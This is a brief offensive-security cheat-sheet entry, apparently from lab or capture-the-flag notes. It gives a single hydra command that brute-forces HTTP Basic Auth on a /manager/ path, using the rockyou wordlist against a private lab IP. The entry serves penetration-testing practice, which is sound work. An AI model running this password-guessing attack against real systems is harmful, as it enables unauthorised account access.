---
title: Hydra - HTTP Basic Auth Bruteforce
category: initial-access
subcategory: bruteforce
os: linux
command: hydra http-get /manager/
tools: hydra
---


### Bruteforce HTTP Basic Auth

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt -s 1234 10.10.147.218 http-get /manager/
```
